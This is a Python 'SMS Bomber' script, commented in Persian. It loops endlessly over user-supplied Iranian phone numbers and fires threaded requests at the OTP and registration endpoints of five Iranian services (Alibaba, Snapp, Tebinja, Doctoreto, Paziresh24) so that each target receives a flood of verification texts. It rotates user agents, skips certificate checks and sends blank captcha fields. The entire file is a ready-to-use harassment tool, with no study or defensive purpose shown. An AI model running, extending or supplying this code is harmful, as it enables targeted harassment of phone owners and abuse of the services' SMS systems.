import requests
import re
import uuid
import time
from threading import Thread
from time import sleep
import socket
import urllib3
import random

# غیرفعال کردن هشدارهای urllib3
urllib3.disable_warnings()

# تعریف user_agents
user_agents = [
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/109.0 Firefox/109.0", 
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15"
]

# رنگ‌ها برای خروجی
r, g, y, a = '\033[31;1m', '\033[32;1m', '\033[33;1m', '\033[0m'

# ==========================
# بررسی اتصال اینترنت
# ==========================
def check_internet():
    try:
        socket.gethostbyname("smtp.gmail.com")
        return True
    except socket.gaierror:
        return False

# ==========================
# اعتبارسنجی شماره‌ها
# ==========================
def is_phone(phone_input: str):
    phones = phone_input.split('-')
    valid_phones = []
    for phone in phones:
        phone = phone.strip()
        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
        else:
            print(f"{r}[-] Invalid Phone: {phone}{a}")
    return valid_phones if valid_phones else False

# ==========================
# تابع ارسال ایمن
# ==========================
def send_service_safe(service, phone):
    try:
        result = service(phone)
        if result:
            print(f"{g}[+] {service.__name__}: Code Sent!{a}")
        else:
            print(f"{y}[-] {service.__name__}: Failed or No Response{a}")
    except Exception as e:
        print(f"{r}[!] Error in {service.__name__}: {e}{a}")

# ==========================
# توابع سرویس‌ها
# ==========================


def paziresh24(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        session = requests.Session()
        
        # دریافت صفحه اصلی برای گرفتن cookies
        session.get("https://www.paziresh24.com/", timeout=10)
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
            "Origin": "https://www.paziresh24.com",
            "Referer": "https://www.paziresh24.com/patient/"
        }
        
        # چندین endpoint ممکن را امتحان می‌کنیم
        endpoints = [
            "https://www.paziresh24.com/api/v1/auth/send-otp",
            "https://api.paziresh24.com/v1/auth/send-otp", 
            "https://apigw.paziresh24.com/gozargah/send-otp",
            "https://www.paziresh24.com/patient/api/send-otp"
        ]
        
        payload = {"mobile": formatted_phone}
        
        for endpoint in endpoints:
            try:
                response = session.post(
                    endpoint,
                    json=payload,
                    headers=headers,
                    timeout=10,
                    verify=False
                )
                
                print(f'{y}[paziresh24] {endpoint} Status: {response.status_code}{a}')
                
                if response.status_code == 200:
                    print(f'{g}(paziresh24) SMS sent successfully! ✅{a}')
                    return True
                    
            except Exception as e:
                print(f'{r}[!] Error with {endpoint}: {e}{a}')
                continue
        
        print(f'{r}[-] paziresh24: All endpoints failed{a}')
        return False
            
    except Exception as e:
        print(f'{r}[!] paziresh24 exception: {e}{a}')
        return False
                


def tebinja(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        formatted_phone = f"0{formatted_phone}"
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "User-Agent": random.choice(user_agents),
        }
        
        payload = {
            "username": formatted_phone,
            "captchaHash": "",
            "captchaValue": ""
        }
        
        response = requests.post(
            "https://www.tebinja.com/api/v1/users",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] tebinja Status: {response.status_code}{a}')
        print(f'{y}[Debug] tebinja Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(tebinja) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] tebinja error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] tebinja exception: {e}{a}')
        return False


def alibaba(phone):
    try:
        # حذف +98 و همه غیراعداد، و بدون اضافه کردن صفر
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        payload = {"phoneNumber": formatted_phone}  # بدون صفر اول
        
        headers = {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "ab-channel": "WEB-NEW, PRODUCTION,CSR,www.alibaba.ir, mobile, Mobile Safari, 18.6, iPhone, Apple, iOS, 18.6,3.200.8",
            "tracing-sessionid": "ab-alohomora",
            "tracing-device": "mobile, Mobile Safari, 18.6, iPhone, Apple,iOS",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
        }
        
        response = requests.post(
            'https://ws.alibaba.ir/api/v3/account/mobile/otp', 
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        if response.status_code == 200:
            data = response.json()
            if data.get("success"):
                print(f'{g}(alibaba) code sent to {formatted_phone}{a}')
                return True
            else:
                print(f'{r}[-] alibaba failed: {data.get("error", "Unknown error")}{a}')
                return False
        else:
            print(f'{r}[-] alibaba http error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f"{r}[!] alibaba exception: {e}{a}")
        return False


def snapp(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            "Accept": "application/json",
            "Content-Type": "application/json"
        }
        
        payload = {
            "cellphone": f"+98{formatted_phone}"
        }
        
        response = requests.post(
            "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] snapp Status: {response.status_code}{a}')
        print(f'{y}[Debug] snapp Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(snapp) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] snapp error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] snapp exception: {e}{a}')
        return False


def drto(phone):
    try:
        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
        
        headers = {
            "Accept": "application/json",
            "Content-Type": "application/json", 
            "app-version": "2.0.0",
            "User-Agent": random.choice(user_agents),
        }
        
        payload = {
            "mobile": formatted_phone,
            "country_id": 205,
            "captcha": ""
        }
        
        response = requests.post(
            "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
            json=payload,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        print(f'{y}[Debug] drto Status: {response.status_code}{a}')
        print(f'{y}[Debug] drto Response: {response.text}{a}')
        
        if response.status_code in [200, 201]:
            print(f'{g}(drto) sms sent successfully!{a}')
            return True
        else:
            print(f'{r}[-] drto error: {response.status_code}{a}')
            return False
            
    except Exception as e:
        print(f'{r}[!] drto exception: {e}{a}')
        return False


# ==========================
# لیست سرویس‌ها
# =======================



services = [
    alibaba, snapp, tebinja, drto, paziresh24
]

# ==========================
# تابع VIP مولتی‌تردینگ
# ==========================
def vip(phones, delay=0.1):
    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
    print(f"{g}Services Loaded: {y}{len(services)}{a}")
    print(f"{g}Delay: {y}{delay}s{a}")
    print(f"{y}══════════════════════════════════════════════{a}")
    
    try:
        while True:
            for phone in phones:
                for service in services:
                    Thread(target=send_service_safe, args=(service, phone)).start()
                    sleep(delay)
    except KeyboardInterrupt:
        print(f"{g}[+] Mission Completed!{a}")

# ==========================
# منوی اصلی
# ==========================
def main_menu():
    print(f"""
{y}╔════════════════════════════════════════════╗
{g}║                SMS Bomber                 ║
{y}╚════════════════════════════════════════════╝
{g} Services Loaded: {y}{len(services)}{a}
{y}══════════════════════════════════════════════
{g} Enter phone numbers (separated by - for multiple):
{a} Example: +989123456789-+989987654321
{y}══════════════════════════════════════════════
""")

# ==========================
# نقطه ورود
# ==========================
if __name__ == "__main__":
    if not check_internet():
        print(f"{r}[-] No internet connection!{a}")
    else:
        main_menu()
        phones = None
        while not phones:
            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
            phones = is_phone(phone_input)
            if not phones:
                print(f"{r}[-] No valid phones entered!{a}")
        try:
            delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
        except ValueError:
            delay = 0.1
        vip(phones, delay)
